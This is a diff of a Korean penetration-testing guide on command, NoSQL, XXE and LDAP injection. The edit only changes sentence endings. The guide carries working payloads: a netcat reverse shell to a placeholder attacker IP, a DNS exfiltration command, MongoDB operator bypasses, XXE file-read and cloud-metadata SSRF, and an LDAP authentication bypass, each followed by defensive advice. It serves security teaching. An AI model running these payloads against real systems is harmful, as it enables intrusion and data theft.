@@ -225,15 +225,15 @@ The key is to manipulate the LDAP filter syntax `(attribute=value)`.
 
 ## 1. Command Injection: The Shell is the Limit
 
-Command Injection은 우리가 마주할 수 있는 가장 치명적인 취약점 중 하나입니다. 성공 시, 단순히 데이터를 탈취하는 것을 넘어 서버의 제어권을 직접 획득하는 'Holy Grail'로 이어질 수 있습니다.
+Command Injection은 우리가 마주할 수 있는 가장 치명적인 취약점 중 하나이다. 성공 시, 단순히 데이터를 탈취하는 것을 넘어 서버의 제어권을 직접 획득하는 'Holy Grail'로 이어질 수 있다.
 
 ### The Core Concept
 
-애플리케이션이 사용자 입력을 받아 OS 커맨드를 실행하는 과정에서, 입력값에 대한 부적절한 검증 및 처리로 인해 공격자가 임의의 시스템 명령어를 실행하게 되는 취약점입니다.
+애플리케이션이 사용자 입력을 받아 OS 커맨드를 실행하는 과정에서, 입력값에 대한 부적절한 검증 및 처리로 인해 공격자가 임의의 시스템 명령어를 실행하게 되는 취약점이다.
 
 ### Primary Attack Vectors
 
-개발자가 편의를 위해 시스템 셸을 직접 호출하는 기능에서 주로 발견됩니다.
+개발자가 편의를 위해 시스템 셸을 직접 호출하는 기능에서 주로 발견된다.
 
   * **진단 도구**: `ping`, `nslookup`, `traceroute` 기능을 제공하는 웹 인터페이스
   * **파일 처리**: 이미지 변환(ImageMagick), 파일 압축/해제, 파일 포맷 변환 기능
@@ -242,9 +242,9 @@ Command Injection은 우리가 마주할 수 있는 가장 치명적인 취약�
 
 ### Exploitation Techniques
 
-단순한 `whoami` 실행을 넘어, 체계적인 접근이 필요합니다.
+단순한 `whoami` 실행을 넘어, 체계적인 접근이 필요하다.
 
-1.  **명령어 구분자(Command Separator) 탐색**: 필터링 환경을 우회하기 위해 다양한 구분자를 테스트해야 합니다.
+1.  **명령어 구분자(Command Separator) 탐색**: 필터링 환경을 우회하기 위해 다양한 구분자를 테스트해야 한다.
 
       * `;` : 앞의 명령이 실패해도 뒷 명령 실행 (가장 일반적)
       * `&&`: 앞의 명령이 성공해야 뒷 명령 실행
@@ -262,7 +262,7 @@ Command Injection은 우리가 마주할 수 있는 가장 치명적인 취약�
       * **Out-of-band (OAST)**: ` nslookup  `whoami`.your-burp-collaborator-domain.com` - 방화벽으로 인해 직접적인 응답을 받기 어려울 때, DNS 쿼리를 이용해 외부에서 데이터를 확인.
 
 3.  **Reverse Shell - The Ultimate Goal**:
-    단발성 명령어 주입을 넘어, 서버의 셸을 획득하는 것이 핵심입니다. 환경에 따라 다양한 페이로드가 사용됩니다.
+    단발성 명령어 주입을 넘어, 서버의 셸을 획득하는 것이 핵심이다. 환경에 따라 다양한 페이로드가 사용된다.
 
     **Classic Netcat Reverse Shell:**
     `ip_address; rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <ATTACKER_IP> <PORT> >/tmp/f`
@@ -272,24 +272,24 @@ Command Injection은 우리가 마주할 수 있는 가장 치명적인 취약�
 
 ### 방어 전략 (Defensive Strategies)
 
-보고서에 이 취약점을 보고할 때, 개발팀에게 다음과 같은 구체적인 방어 전략을 제시해야 합니다.
+보고서에 이 취약점을 보고할 때, 개발팀에게 다음과 같은 구체적인 방어 전략을 제시해야 한다.
 
-1.  **OS 명령어 직접 호출 금지**: 가능한 한 시스템 셸을 직접 호출하는 `system()`, `exec()` 등의 함수 사용을 피하고, 프로그래밍 언어가 제공하는 내장 API를 사용하도록 권고해야 합니다. 예를 들어, 파일이 존재하는지 확인하고 싶다면 `os.system("ls " + filename)` 대신 `os.path.exists(filename)`를 사용하는 것이 근본적인 해결책입니다.
+1.  **OS 명령어 직접 호출 금지**: 가능한 한 시스템 셸을 직접 호출하는 `system()`, `exec()` 등의 함수 사용을 피하고, 프로그래밍 언어가 제공하는 내장 API를 사용하도록 권고해야 한다. 예를 들어, 파일이 존재하는지 확인하고 싶다면 `os.system("ls " + filename)` 대신 `os.path.exists(filename)`를 사용하는 것이 근본적인 해결책이다.
 
-2.  **명령어와 인자 분리**: 부득이하게 외부 명령어를 실행해야 한다면, 사용자 입력이 셸에 의해 해석되지 않도록 명령어와 인자를 명확하게 분리해서 전달해야 합니다.
+2.  **명령어와 인자 분리**: 부득이하게 외부 명령어를 실행해야 한다면, 사용자 입력이 셸에 의해 해석되지 않도록 명령어와 인자를 명확하게 분리해서 전달해야 한다.
 
-      * **Python 예시:** `subprocess.run(['ls', '-l', user_input], shell=False)` 와 같이 `shell=False` 옵션을 사용하고 인자를 배열로 전달하면, `user_input`은 단순한 문자열로 취급되어 셸 메타 문자가 해석되지 않습니다.
+      * **Python 예시:** `subprocess.run(['ls', '-l', user_input], shell=False)` 와 같이 `shell=False` 옵션을 사용하고 인자를 배열로 전달하면, `user_input`은 단순한 문자열로 취급되어 셸 메타 문자가 해석되지 않는다.
 
-3.  **입력값 검증 및 이스케이프**: 최후의 수단으로, 허용된 문자만 받는 'Allow List' 기반의 검증을 적용하고, 셸에서 특별한 의미를 갖는 메타 문자(`; | & $ > < \` ' "\`)를 이스케이프 처리하도록 가이드해야 합니다. 하지만 이 방법은 우회 가능성이 높아 권장되지 않습니다.
+3.  **입력값 검증 및 이스케이프**: 최후의 수단으로, 허용된 문자만 받는 'Allow List' 기반의 검증을 적용하고, 셸에서 특별한 의미를 갖는 메타 문자(`; | & $ > < \` ' "\`)를 이스케이프 처리하도록 가이드해야 한다. 하지만 이 방법은 우회 가능성이 높아 권장되지 않는다.
 
 
 ## 2. NoSQL Injection: Abusing the Flexibility of Modern Databases
 
-MongoDB, Cassandra, Redis와 같은 NoSQL 데이터베이스의 사용이 증가하면서 새로운 형태의 인젝션이 부상했습니다. SQL과 문법은 다르지만, '사용자 입력을 신뢰하여 쿼리를 동적으로 구성한다'는 근본적인 취약점은 동일합니다.
+MongoDB, Cassandra, Redis와 같은 NoSQL 데이터베이스의 사용이 증가하면서 새로운 형태의 인젝션이 부상했다. SQL과 문법은 다르지만, '사용자 입력을 신뢰하여 쿼리를 동적으로 구성한다'는 근본적인 취약점은 동일하다.
 
 ### The Core Concept
 
-NoSQL 쿼리(주로 JSON 객체 형태)에 데이터 대신 쿼리 연산자를 주입하여 인증을 우회하거나 데이터를 조작하는 공격입니다.
+NoSQL 쿼리(주로 JSON 객체 형태)에 데이터 대신 쿼리 연산자를 주입하여 인증을 우회하거나 데이터를 조작하는 공격이다.
 
 ### Primary Attack Vectors
 
@@ -298,11 +298,11 @@ NoSQL 쿼리(주로 JSON 객체 형태)에 데이터 대신 쿼리 연산자를 
 
 ### Exploitation Techniques
 
-SQLi의 `' or '1'='1` 처럼, NoSQL에서는 **연산자 주입(Operator Injection)**이 핵심입니다.
+SQLi의 `' or '1'='1` 처럼, NoSQL에서는 **연산자 주입(Operator Injection)**이 핵심이다.
 
 **Payload Example (MongoDB - Authentication Bypass):**
 
-일반적인 로그인 쿼리는 다음과 같습니다.
+일반적인 로그인 쿼리는 다음과 같다.
 `db.users.findOne({username: "user_input", password: "password_input"})`
 
 1.  **Not Equal (`$ne`)**: 비밀번호를 모를 때, '특정 값이 아닌 아무거나'를 조건으로 제시.
@@ -323,33 +323,33 @@ SQLi의 `' or '1'='1` 처럼, NoSQL에서는 **연산자 주입(Operator Injecti
       * **Resulting Query:** `db.users.findOne({username: "admin", password: {"$regex": "^a"}})`
       * 비밀번호가 'a'로 시작하는지 확인. 이를 통해 Blind 형태로 비밀번호를 한 글자씩 유추 가능.
 
-4.  **Server-Side Javascript Injection**: 일부 오래된 MongoDB 버전이나 특정 라이브러리(`$where`, `mapReduce`)는 서버 측에서 Javascript 실행을 허용합니다. 이는 Command Injection으로 이어질 수 있는 치명적인 벡터입니다.
+4.  **Server-Side Javascript Injection**: 일부 오래된 MongoDB 버전이나 특정 라이브러리(`$where`, `mapReduce`)는 서버 측에서 Javascript 실행을 허용한다. 이는 Command Injection으로 이어질 수 있는 치명적인 벡터이다.
 
       * **Payload Example:** `db.collection.find({$where: "sleep(5000)"})` - 5초 지연 발생 시 취약.
 
 ### 방어 전략 (Defensive Strategies)
 
-1.  **문자열 기반 쿼리 생성 금지**: 개발자가 사용자 입력을 받아 직접 JSON과 같은 쿼리 문자열을 조립하지 않도록 강력하게 권고해야 합니다.
+1.  **문자열 기반 쿼리 생성 금지**: 개발자가 사용자 입력을 받아 직접 JSON과 같은 쿼리 문자열을 조립하지 않도록 강력하게 권고해야 한다.
 
-2.  **ODM(Object-Document Mapper) 사용**: Mongoose(Node.js), MongoEngine(Python)과 같은 ODM 라이브러리 사용을 권장해야 합니다. ODM은 개발자가 객체 지향적인 방식으로 DB와 상호작용하게 하며, 내부적으로 안전한 쿼리 생성을 처리해 줍니다. 이는 SQL의 Prepared Statement와 같은 역할을 합니다.
+2.  **ODM(Object-Document Mapper) 사용**: Mongoose(Node.js), MongoEngine(Python)과 같은 ODM 라이브러리 사용을 권장해야 한다. ODM은 개발자가 객체 지향적인 방식으로 DB와 상호작용하게 하며, 내부적으로 안전한 쿼리 생성을 처리해 준다. 이는 SQL의 Prepared Statement와 같은 역할을 한다.
 
-3.  **입력값 타입 강제**: 사용자 입력값을 서버에서 처리하기 전에 항상 예상되는 데이터 타입(예: String, Integer)으로 강제 변환해야 합니다. `password: {"$ne": null}` 과 같은 공격은 `password` 필드가 문자열이 아닌 객체로 인식될 때 발생하므로, 타입 강제는 효과적인 방어 수단입니다.
+3.  **입력값 타입 강제**: 사용자 입력값을 서버에서 처리하기 전에 항상 예상되는 데이터 타입(예: String, Integer)으로 강제 변환해야 한다. `password: {"$ne": null}` 과 같은 공격은 `password` 필드가 문자열이 아닌 객체로 인식될 때 발생하므로, 타입 강제는 효과적인 방어 수단이다.
 
-4.  **연산자 필터링**: 사용자 입력에서 `$` 문자로 시작하는 키워드(예: `$ne`, `$gt`, `$where`)를 감지하고 차단하는 로직을 추가하도록 제안할 수 있습니다.
+4.  **연산자 필터링**: 사용자 입력에서 `$` 문자로 시작하는 키워드(예: `$ne`, `$gt`, `$where`)를 감지하고 차단하는 로직을 추가하도록 제안할 수 있다.
 
 
 ## 3. XML Injection & XXE: The Deceptive Data Format
 
-XML은 레거시 SOAP API부터 최신 설정 파일까지 여전히 널리 사용됩니다. XPath Injection이 쿼리 조작에 집중한다면, XML Injection과 그 최종 진화형인 XXE는 XML 파서 자체를 공격하여 훨씬 더 심각한 피해를 유발합니다.
+XML은 레거시 SOAP API부터 최신 설정 파일까지 여전히 널리 사용된다. XPath Injection이 쿼리 조작에 집중한다면, XML Injection과 그 최종 진화형인 XXE는 XML 파서 자체를 공격하여 훨씬 더 심각한 피해를 유발한다.
 
 ### XML Injection vs. XXE
 
   * **XML Injection**: XML 문서의 구조를 조작하여 `isAdmin`과 같은 노드를 삽입, 애플리케이션의 비즈니스 로직을 공격.
-  * **XXE (XML External Entity) Injection**: XML의 '외부 엔티티' 기능을 악용, 서버가 외부 리소스를 로드하게 만들어 서버 내부 파일을 읽거나 내부 네트워크를 스캔. **이것이 진짜 위협입니다.**
+  * **XXE (XML External Entity) Injection**: XML의 '외부 엔티티' 기능을 악용, 서버가 외부 리소스를 로드하게 만들어 서버 내부 파일을 읽거나 내부 네트워크를 스캔. **이것이 진짜 위협이다.**
 
 ### Exploiting XXE
 
-XXE는 DTD(Document Type Definition)를 통해 외부 엔티티를 선언함으로써 발생합니다.
+XXE는 DTD(Document Type Definition)를 통해 외부 엔티티를 선언함으로써 발생한다.
 
 1.  **File Disclosure (Classic XXE)**: 서버의 로컬 파일을 유출.
 
@@ -359,9 +359,9 @@ XXE는 DTD(Document Type Definition)를 통해 외부 엔티티를 선언함으�
     <stockCheck><productId>&xxe;</productId></stockCheck>
     ```
 
-    위 페이로드가 전송되면, XML 파서는 `&xxe;`를 `/etc/passwd` 파일의 내용으로 치환하여 응답에 포함시킵니다.
+    위 페이로드가 전송되면, XML 파서는 `&xxe;`를 `/etc/passwd` 파일의 내용으로 치환하여 응답에 포함시킨다.
 
-2.  **SSRF (Server-Side Request Forgery)**: 서버가 공격자를 대신해 내부 또는 외부 네트워크에 요청을 보내게 함. 클라우드 환경에서 Metadata API (`http://169.254.169.254`)를 공격하는 데 매우 효과적입니다.
+2.  **SSRF (Server-Side Request Forgery)**: 서버가 공격자를 대신해 내부 또는 외부 네트워크에 요청을 보내게 함. 클라우드 환경에서 Metadata API (`http://169.254.169.254`)를 공격하는 데 매우 효과적이다.
 
     ```xml
     <?xml version="1.0" encoding="UTF-8"?>
@@ -384,9 +384,9 @@ XXE는 DTD(Document Type Definition)를 통해 외부 엔티티를 선언함으�
 
 ### 방어 전략 (Defensive Strategies)
 
-XXE는 방어 방법이 매우 명확합니다. 보고서에 반드시 다음 내용을 포함시켜야 합니다.
+XXE는 방어 방법이 매우 명확하다. 보고서에 반드시 다음 내용을 포함시켜야 한다.
 
-1.  **외부 엔티티(External Entity) 및 DTD 비활성화**: XML 파서의 설정을 변경하여 외부 엔티티와 DTD 처리를 비활성화하는 것이 가장 확실하고 근본적인 해결책입니다. 대부분의 최신 XML 파서는 기본적으로 비활성화되어 있지만, 레거시 시스템에서는 활성화된 경우가 많습니다.
+1.  **외부 엔티티(External Entity) 및 DTD 비활성화**: XML 파서의 설정을 변경하여 외부 엔티티와 DTD 처리를 비활성화하는 것이 가장 확실하고 근본적인 해결책이다. 대부분의 최신 XML 파서는 기본적으로 비활성화되어 있지만, 레거시 시스템에서는 활성화된 경우가 많다.
 
       * **Java 예시:**
 
@@ -409,21 +409,21 @@ XXE는 방어 방법이 매우 명확합니다. 보고서에 반드시 다음 �
         tree = etree.parse(xml_file, parser)
         ```
 
-2.  **신뢰할 수 없는 XML 입력 필터링**: 만약 DTD 비활성화가 불가능한 환경이라면, 사용자 입력에 `<!DOCTYPE`, `<!ENTITY`, `SYSTEM`, `PUBLIC`과 같은 키워드가 포함되어 있는지 검사하고 차단해야 합니다.
+2.  **신뢰할 수 없는 XML 입력 필터링**: 만약 DTD 비활성화가 불가능한 환경이라면, 사용자 입력에 `<!DOCTYPE`, `<!ENTITY`, `SYSTEM`, `PUBLIC`과 같은 키워드가 포함되어 있는지 검사하고 차단해야 한다.
 
 
 ## 4. LDAP Injection: The Corporate Directory's Weakness
 
-기업 환경의 인증 메커니즘을 테스트할 때 LDAP Injection은 강력한 무기입니다. 많은 기업들이 Active Directory와 같은 LDAP 기반 시스템으로 사용자 인증 및 정보 조회를 처리하기 때문입니다.
+기업 환경의 인증 메커니즘을 테스트할 때 LDAP Injection은 강력한 무기이다. 많은 기업들이 Active Directory와 같은 LDAP 기반 시스템으로 사용자 인증 및 정보 조회를 처리하기 때문이다.
 
 ### Exploiting LDAP
 
-LDAP 필터 문법 `(attribute=value)`을 조작하는 것이 핵심입니다.
+LDAP 필터 문법 `(attribute=value)`을 조작하는 것이 핵심이다.
 
   * **Authentication Bypass**:
 
       * **Payload:** `*)(uid=*))(|(uid=*`
-      * 사용자 이름에 위 페이로드를 입력하면, `(&(uid=*)(uid=*))(|(uid=*))`)\` 와 같은 필터가 구성되어 항상 참이 되면서 인증을 우회할 수 있습니다.
+      * 사용자 이름에 위 페이로드를 입력하면, `(&(uid=*)(uid=*))(|(uid=*))`)\` 와 같은 필터가 구성되어 항상 참이 되면서 인증을 우회할 수 있다.
 
   * **Information Enumeration**: 와일드카드(`*`)와 논리 연산자(`|`, `&`)를 이용해 정보를 유출.
 
@@ -432,6 +432,6 @@ LDAP 필터 문법 `(attribute=value)`을 조작하는 것이 핵심입니다.
 
 ### 방어 전략 (Defensive Strategies)
 
-1.  **LDAP 이스케이프 처리**: LDAP 필터에서 특별한 의미를 갖는 문자들( `( ) & | = * \` 등)을 이스케이프 처리해야 합니다. 대부분의 프로그래밍 언어는 이를 위한 안전한 라이브러리나 함수를 제공하므로, 직접 구현하기보다는 검증된 라이브러리를 사용하도록 권고해야 합니다.
+1.  **LDAP 이스케이프 처리**: LDAP 필터에서 특별한 의미를 갖는 문자들( `( ) & | = * \` 등)을 이스케이프 처리해야 한다. 대부분의 프로그래밍 언어는 이를 위한 안전한 라이브러리나 함수를 제공하므로, 직접 구현하기보다는 검증된 라이브러리를 사용하도록 권고해야 한다.
 
-2.  **강력한 입력값 검증**: 사용자 이름, ID 등 특정 형식의 입력이 예상되는 경우, 해당 형식을 벗어나는 특수문자가 포함되지 않도록 'Allow List' 기반의 검증을 적용해야 합니다.
+2.  **강력한 입력값 검증**: 사용자 이름, ID 등 특정 형식의 입력이 예상되는 경우, 해당 형식을 벗어나는 특수문자가 포함되지 않도록 'Allow List' 기반의 검증을 적용해야 한다.
